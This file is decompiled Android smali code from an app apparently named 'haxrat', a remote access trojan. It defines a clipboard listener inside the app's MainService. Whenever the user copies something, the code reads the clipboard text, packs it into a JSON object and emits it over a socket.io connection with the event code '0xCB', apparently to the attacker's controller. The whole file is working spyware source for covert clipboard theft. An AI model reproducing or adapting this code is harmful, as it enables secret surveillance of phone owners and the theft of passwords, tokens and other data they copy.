.class Lcom/hax4us/haxrat/MainService$100000000;
.super Ljava/lang/Object;
.source "MainService.java"

# interfaces
.implements Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/MainService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/hax4us/haxrat/MainService;


# direct methods
.method constructor <init>(Lcom/hax4us/haxrat/MainService;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/hax4us/haxrat/MainService$100000000;->this$0:Lcom/hax4us/haxrat/MainService;

    return-void
.end method

.method static access$0(Lcom/hax4us/haxrat/MainService$100000000;)Lcom/hax4us/haxrat/MainService;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/MainService$100000000;->this$0:Lcom/hax4us/haxrat/MainService;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onPrimaryClipChanged()V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 56
    move-object v0, p0

    move-object v7, v0

    iget-object v7, v7, Lcom/hax4us/haxrat/MainService$100000000;->this$0:Lcom/hax4us/haxrat/MainService;

    const-string v8, "clipboard"

    invoke-virtual {v7, v8}, Lcom/hax4us/haxrat/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/content/ClipboardManager;

    move-object v2, v7

    .line 57
    move-object v7, v2

    invoke-virtual {v7}, Landroid/content/ClipboardManager;->hasPrimaryClip()Z

    move-result v7

    if-eqz v7, :cond_0

    .line 58
    move-object v7, v2

    invoke-virtual {v7}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v7

    move-object v3, v7

    .line 59
    move-object v7, v3

    invoke-virtual {v7}, Landroid/content/ClipData;->getItemCount()I

    move-result v7

    const/4 v8, 0x0

    if-le v7, v8, :cond_0

    .line 60
    move-object v7, v3

    const/4 v8, 0x0

    invoke-virtual {v7, v8}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;

    move-result-object v7

    invoke-virtual {v7}, Landroid/content/ClipData$Item;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    move-object v4, v7

    .line 61
    move-object v7, v4

    if-eqz v7, :cond_0

    .line 63
    :try_start_0
    new-instance v7, Lorg/json/JSONObject;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    invoke-direct {v8}, Lorg/json/JSONObject;-><init>()V

    move-object v5, v7

    .line 64
    move-object v7, v5

    const-string v8, "text"

    move-object v9, v4

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 65
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v7

    invoke-virtual {v7}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v7

    const-string v8, "0xCB"

    const/4 v9, 0x1

    new-array v9, v9, [Ljava/lang/Object;

    move-object v13, v9

    move-object v9, v13

    move-object v10, v13

    const/4 v11, 0x0

    move-object v12, v5

    aput-object v12, v10, v11

    invoke-virtual {v7, v8, v9}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v7

    .line 67
    :cond_0
    :goto_0
    return-void

    .line 65
    :catch_0
    move-exception v7

    move-object v5, v7

    .line 67
    move-object v7, v5

    invoke-virtual {v7}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method
